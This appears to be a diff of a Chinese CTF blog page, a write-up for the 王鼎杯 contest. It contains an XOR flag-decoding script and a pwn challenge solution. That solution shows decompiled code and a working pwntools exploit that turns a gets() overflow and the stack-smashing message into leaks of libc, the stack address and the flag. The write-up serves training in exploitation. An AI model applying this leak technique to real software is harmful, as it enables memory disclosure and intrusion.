+<p>是他们兄弟俩异或得来的。<br>用别人一段脚本。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">s=&apos;K@LKVHr[DXEsLsYI@\\AMYIr\\EIZQ&apos;</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for i in range(len(s)):</span><br><span class="line">    if i%2==0:</span><br><span class="line">        flag+=chr(ord(s[i])^45)</span><br><span class="line">    else:</span><br><span class="line">        flag+=chr(ord(s[i])^44)</span><br><span class="line">print flag</span><br><span class="line"></span><br><span class="line">flag&#123;d_with_a_template_phew&#125;</span><br></pre></td></tr></table></figure></p>
+<p>总结：复杂的题往往可以简单化，之一flag的作用，可以尝试异或一下。</p>
+<hr>
+<p><strong>pwn1(GUESS)</strong><br><img src="http://i2.bvimg.com/659021/672942d3032c7f2c.png" alt="image0001"><br>开启了NX保护和stack。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  __WAIT_STATUS stat_loc; // [rsp+14h] [rbp-8Ch]</span><br><span class="line">  int v5; // [rsp+1Ch] [rbp-84h]</span><br><span class="line">  __int64 v6; // [rsp+20h] [rbp-80h]</span><br><span class="line">  __int64 v7; // [rsp+28h] [rbp-78h]</span><br><span class="line">  char buf; // [rsp+30h] [rbp-70h]</span><br><span class="line">  char s2; // [rsp+60h] [rbp-40h]</span><br><span class="line">  unsigned __int64 v10; // [rsp+98h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(0x28u);</span><br><span class="line">  v7 = 3LL;</span><br><span class="line">  LODWORD(stat_loc.__uptr) = 0;</span><br><span class="line">  v6 = 0LL;</span><br><span class="line">  sub_4009A6();</span><br><span class="line">  HIDWORD(stat_loc.__iptr) = open(&quot;./flag.txt&quot;, 0, a2);</span><br><span class="line">  if ( HIDWORD(stat_loc.__iptr) == -1 )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(&quot;./flag.txt&quot;);</span><br><span class="line">    _exit(-1);</span><br><span class="line">  &#125;</span><br><span class="line">  read(SHIDWORD(stat_loc.__iptr), &amp;buf, 0x30uLL);</span><br><span class="line">  close(SHIDWORD(stat_loc.__iptr));</span><br><span class="line">  puts(&quot;This is GUESS FLAG CHALLENGE!&quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v6 &gt;= v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;you have no sense... bye :-) &quot;);</span><br><span class="line">      return 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = sub_400A11();</span><br><span class="line">    if ( !v5 )</span><br><span class="line">      break;</span><br><span class="line">    ++v6;</span><br><span class="line">    wait((__WAIT_STATUS)&amp;stat_loc);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;Please type your guessing flag&quot;);</span><br><span class="line">  gets(&amp;s2);</span><br><span class="line">  if ( !strcmp(&amp;buf, &amp;s2) )</span><br><span class="line">    puts(&quot;You must have great six sense!!!! :-o &quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;You should take more effort to get six sence, and one more challenge!!&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>需要知道关于fork函数和canary保护。</p>
+<p>fork函数是复制，创建一个子进程，子进程会复制父进程的所有信息。但是子进程你是个单独的进程，不会影响到父进程。</p>
+<p>stack保护：就是在栈里面放一个canary如果canary被改变程序会退出，并且打印出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*** stack smashing detected ***:</span><br></pre></td></tr></table></figure></p>
+<p>加可执行文件（路径加）名字效果如图（只是适合ubuntu16到ubuntu18不会输出）</p>
+<p><img src="http://i4.bvimg.com/659021/52bf7139021be9b4.png" alt="image0001"></p>
+<p>思路：三次leak。</p>
+<p>1.泄露got表值，获取到libc库的加载地址</p>
+<p>2.计算出environ的指针，泄露出environ的地址（也就是栈的地址）。</p>
+<p>3.复写为flag内容的地址get flag。</p>
+<p>刚好三次fork</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&quot;debug&quot;</span><br><span class="line"></span><br><span class="line">p=process(&quot;./guess&quot;)</span><br><span class="line">elf=ELF(&quot;./guess&quot;)	</span><br><span class="line">libc=ELF(&quot;libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;Please type your guessing flag\n&quot;)</span><br><span class="line">payload=&apos;A&apos;*0x128+p64(elf.got[&quot;read&quot;])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">print p.recvuntil(&quot;***: &quot;)</span><br><span class="line">read_addr=u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">print &quot;read_addr=&quot;+hex(read_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;Please type your guessing flag\n&quot;)</span><br><span class="line">environ_pointer=read_addr-libc.symbols[&quot;read&quot;]+libc.symbols[&quot;__environ&quot;]</span><br><span class="line">payload=&apos;A&apos;*0x128+p64(environ_pointer)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">print p.recvuntil(&quot;***: &quot;)</span><br><span class="line">environ_addr=u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">print &quot;environ_pointer=&quot;+hex(environ_pointer)</span><br><span class="line">print &quot;environ_addr=&quot;+hex(environ_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">raw_input()</span><br><span class="line">p.recvuntil(&quot;Please type your guessing flag\n&quot;)</span><br><span class="line">payload=&apos;A&apos;*0x128+p64(environ_addr-0x168)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">print p.recvuntil(&quot;***: &quot;)</span><br><span class="line">print p.recvall()</span><br></pre></td></tr></table></figure>
+<p>第三次的fork设置为</p>
+<p><img src="http://i4.bvimg.com/659021/17ff1ff58044630f.png" alt="image0001"><br>需要关注的是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">07:0038│        0x7ffc392a7ea0 ◂— &apos;qwertyuiop\n&apos;</span><br></pre></td></tr></table></figure></p>
+<p>这里是读取出来的flag.txt文件的内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">32:0190│        0x7ffc392a7ff8 —▸ 0x7ffc392aa1de ◂— 0x73736575672f2e /* &apos;./guess&apos; */</span><br></pre></td></tr></table></figure></p>
+<p>这里是输出的内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">34:01a0│        0x7ffc392a8008 —▸ 0x7ffc392aa1e6 ◂— 0x52454d554e5f434c (&apos;LC_NUMER&apos;)</span><br></pre></td></tr></table></figure></p>
+<p>这里是环境变量environ的内容。可以得出来栈地址的偏移。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(0x7ffc392a8008-0x7ffc392a7ea0)</span><br><span class="line">&apos;0x168&apos;</span><br></pre></td></tr></table></figure></p>
+<p>输入数据的指针和0x7ffc392a7ff8的差是需要填充的数据。</p>
+<hr>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/08/26/王鼎杯-教育/" data-id="cjlhi0i8i000bj4l3lkf6z0yk" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
 
     </footer>
   </div>
@@ -295,7 +418,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/08/26/极客巅峰/" data-id="cjlgo9z090008asl38exufktm" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/08/26/极客巅峰/" data-id="cjlhi0i8j000cj4l33ux4x439" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
@@ -378,7 +501,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/08/23/House-Of-Einherjar-2016-Seccon-tinypad/" data-id="cjlgo9z070004asl3ju065ibx" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/08/23/House-Of-Einherjar-2016-Seccon-tinypad/" data-id="cjlhi0i830001j4l3dp5d3sn4" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/堆溢出-house-of-einherjar/">堆溢出,house of einherjar</a></li></ul>
@@ -424,7 +547,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/08/21/通用gatget/" data-id="cjlgo9z0c000basl36ihllo9v" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/08/21/通用gatget/" data-id="cjlhi0i8w000ij4l3ekz1uvsk" class="article-share-link">Share</a>
       
       
     </footer>
@@ -467,7 +590,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/08/21/rop32/" data-id="cjlgo9z080005asl34tbv74ve" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/08/21/rop32/" data-id="cjlhi0i8h000aj4l3pb4vxgm5" class="article-share-link">Share</a>
       
       
     </footer>
@@ -512,7 +635,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/08/21/free/" data-id="cjlgo9z060003asl3sj2n8pm8" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/08/21/free/" data-id="cjlhi0i8k000ej4l32so2mkyh" class="article-share-link">Share</a>
       
       
     </footer>
@@ -559,7 +682,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/05/27/rop64/" data-id="cjlgo9z0b0009asl3ivtnaqrf" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/05/27/rop64/" data-id="cjlhi0i860003j4l3oswa14z5" class="article-share-link">Share</a>
       
       
     </footer>
